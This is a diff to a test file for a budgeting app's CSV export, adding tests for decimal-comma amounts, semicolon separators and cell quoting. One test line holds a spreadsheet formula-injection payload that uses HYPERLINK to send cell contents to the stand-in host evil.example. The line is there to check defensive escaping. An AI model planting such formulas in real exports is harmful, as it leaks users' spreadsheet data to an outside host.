@@ -8,7 +8,7 @@ import { db } from '../db/index.js';
 import { apiNotFound, errorHandler } from '../middleware/security.js';
 import { accountsRouter } from './accounts.js';
 import { ACCOUNT_TYPES, defaultOffBudget } from '../utils/accountTypes.js';
-import { escapeCsv } from './export.js';
+import { csvAmount, escapeCsv, exportRouter } from './export.js';
 import { goalsRouter } from './goals.js';
 import { rulesRouter } from './rules.js';
 import { transactionsRouter } from './transactions.js';
@@ -24,6 +24,7 @@ beforeAll(async () => {
   app.use('/api/goals', goalsRouter);
   app.use('/api/rules', rulesRouter);
   app.use('/api/transactions', transactionsRouter);
+  app.use('/api/export', exportRouter);
   app.get('/api/boom', () => {
     throw new Error('secret internal detail at C:\\Users\\someone\\file.ts');
   });
@@ -174,5 +175,48 @@ describe('escapeCsv (property-based)', () => {
     expect(escapeCsv('=HYPERLINK("https://evil.example/?d="&A1,"Click")')).toBe(
       `"'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"`,
     );
+  });
+});
+
+describe('transactions CSV in either number format', () => {
+  it('writes amounts exactly, with a decimal point or a decimal comma', () => {
+    fc.assert(
+      fc.property(fc.integer({ min: -10_000_000_000_000, max: 10_000_000_000_000 }), (cents) => {
+        for (const decimal of ['.', ','] as const) {
+          const text = csvAmount(cents, decimal);
+          expect(text).toMatch(decimal === '.' ? /^-?\d+\.\d{2}$/ : /^-?\d+,\d{2}$/);
+          const [whole, fraction] = text.replace('-', '').split(decimal);
+          expect((cents < 0 ? -1 : 1) * (Number(whole) * 100 + Number(fraction))).toBe(cents);
+        }
+      }),
+    );
+  });
+
+  it('quotes cells holding the separator in use', () => {
+    expect(escapeCsv('Müller; Söhne', ';')).toBe('"Müller; Söhne"');
+    expect(escapeCsv('Müller, Söhne', ';')).toBe('Müller, Söhne');
+    expect(escapeCsv('=1+1', ';')).toBe("'=1+1");
+  });
+
+  it('uses ; between columns and 12,50 amounts with decimal=comma, and refuses other values', async () => {
+    const account = await (await post('/accounts', { name: 'Girokonto', type: 'checking' })).json();
+    await post('/transactions', {
+      accountId: account.id,
+      date: '2026-01-05',
+      amount: -1250,
+      payeeName: 'Bäckerei; Café',
+    });
+    const get = (q: string) =>
+      fetch(`${base}/export/transactions/csv?from=2026-01-05&to=2026-01-05${q}`);
+
+    const comma = await (await get('&decimal=comma')).text();
+    expect(comma.split('\n')[0]).toBe('Date;Account;Payee;Category;Notes;Amount;Reconciled');
+    expect(comma).toContain('2026-01-05;Girokonto;"Bäckerei; Café";;;-12,50;No');
+
+    const dot = await (await get('')).text();
+    expect(dot.split('\n')[0]).toBe('Date,Account,Payee,Category,Notes,Amount,Reconciled');
+    expect(dot).toContain('2026-01-05,Girokonto,Bäckerei; Café,,,-12.50,No');
+
+    expect((await get('&decimal=bogus')).status).toBe(400);
   });
 });
